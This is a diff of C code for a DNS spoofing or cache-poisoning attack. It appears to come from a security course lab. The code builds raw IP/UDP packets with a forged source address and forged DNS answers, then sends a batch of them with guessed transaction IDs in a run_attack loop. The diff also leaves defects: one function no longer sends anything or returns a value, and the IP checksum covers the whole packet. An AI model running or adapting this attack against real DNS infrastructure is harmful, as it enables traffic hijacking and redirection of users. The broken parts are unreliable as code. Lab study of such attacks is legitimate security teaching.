@@ -21,7 +21,6 @@
 #define PACKET_SIZE 1024
 #define DNS_PORT 53
 
-
 int build_dns_query(unsigned char *buffer, const char *hostname, uint32_t tid);
 
 int build_dns_response(unsigned char *buffer, unsigned char *query, int query_len, uint32_t txid);
@@ -71,18 +70,23 @@ unsigned short checksum(void *b, int len) {
     return result;
 }
 
-int full_spoofed_answer(uint txid, uint dest_port) {
+int full_spoofed_answer(uint txid, uint d_port) {
     unsigned char buffer[PACKET_SIZE];
-    unsigned char query[PACKET_SIZE];
     memset(buffer, 0, PACKET_SIZE);
 
-    // Parameters
-    const char *hostname = "example.com";
-    const char *source_ip = "192.168.1.207";
-    const char *dest_ip = "192.168.1.203";
+    // Example DNS query (a simple query for 'example.com')
+    unsigned char query[] = {
+        0x12, 0x34,  // Transaction ID
+        0x01, 0x00,  // Standard query (flags)
+        0x00, 0x01,  // One question
+        0x00, 0x00,  // No answers
+        0x00, 0x00,  // No authority
+        0x00, 0x00,  // No additional sections
+        0x07, 'e', 'x', 'a', 'm', 'p', 'l', 'e', 0x03, 'c', 'o', 'm', 0x00,  // Domain name
+        0x00, 0x01, 0x00, 0x01  // Type A, Class IN
+    };
 
-    // Build DNS query
-    int query_len = build_dns_query(query, hostname, txid);
+    int query_len = sizeof(query);
 
     // Build the DNS response
     int response_len = build_dns_response(buffer, query, query_len, txid);
@@ -93,46 +97,40 @@ int full_spoofed_answer(uint txid, uint dest_port) {
 
     struct sockaddr_in dest;
     dest.sin_family = AF_INET;
-    dest.sin_port = htons(dest_port);
-    dest.sin_addr.s_addr = inet_addr(dest_ip);
+    dest.sin_port = htons(d_port); // Destination port
+    dest.sin_addr.s_addr = inet_addr("192.168.1.203"); // Destination IP
 
     // Fill in the IP header
     iph->ihl = 5;
     iph->version = 4;
     iph->tos = 0;
     iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + response_len);
-    iph->id = htonl(dest_port);
+    iph->id = htonl(54321); // Identification
     iph->frag_off = 0;
     iph->ttl = 255;
     iph->protocol = IPPROTO_UDP;
-    iph->saddr = inet_addr(source_ip);
+    iph->saddr = inet_addr("192.168.1.207"); // Source IP
     iph->daddr = dest.sin_addr.s_addr;
-    iph->check = checksum((unsigned short *)iph, sizeof(struct iphdr));
+    iph->check = 0; // Will calculate later
 
     // Fill in the UDP header
     udph->source = htons(DNS_PORT);
-    udph->dest = htons(dest_port);
+    udph->dest = dest.sin_port;
     udph->len = htons(sizeof(struct udphdr) + response_len);
     udph->check = 0; // Optional
 
-    // Create socket
+    // Calculate IP checksum
+    iph->check = checksum((unsigned short *)buffer, ntohs(iph->tot_len));
+
+    // Create raw socket
     int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
     if (sock < 0) {
         perror("Socket creation failed");
         return EXIT_FAILURE;
     }
 
-    // Send DNS response
-    if (sendto(sock, buffer, ntohs(iph->tot_len), 0, (struct sockaddr *)&dest, sizeof(dest)) < 0) {
-        perror("Packet sending failed");
-        close(sock);
-        return EXIT_FAILURE;
-    }
-
-    printf("DNS response sent successfully!\n");
-    close(sock);
-    return 0;
 }
+
 
 
 // Structure for DNS header and response construction
@@ -222,6 +220,9 @@ void send_spoofed_dns_response(const char *hostname, uint32_t txid, const char *
     printf("response_len: %d\n", response_len);
     printf("query: %s\n", query);
     printf("destination_ip: %s\n", destination_ip);
+    
+    struct iphdr *iph = (struct iphdr *)buffer;
+    iph->saddr = inet_addr("192.168.1.207"); // Source IP
     // Step 5: Send the spoofed DNS response
     if (sendto(sockfd, buffer, response_len, 0, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
         perror("Failed to send spoofed DNS response");
@@ -341,8 +342,8 @@ void run_attack(uint32_t *txid_ls) {
     printf("source port : %u\n", source_port);
     fill_txids(txid_ls, txid);
     for (int i = 0; i < 10; i++) {
-        // send_spoofed_dns_response("www.example.cybercourse.com", txid_ls[i], DNS_SERVER_IP, source_port, txid_ls[i]);
-        full_spoofed_answer(txid_ls[i], source_port);
+        send_spoofed_dns_response("www.example.cybercourse.com", txid_ls[i], DNS_SERVER_IP, source_port, txid_ls[i]);
+        // full_spoofed_answer(txid_ls[i], source_port);
         printf("sent spoofed response %d with txid %u\n", i, txid_ls[i]);
     }
     
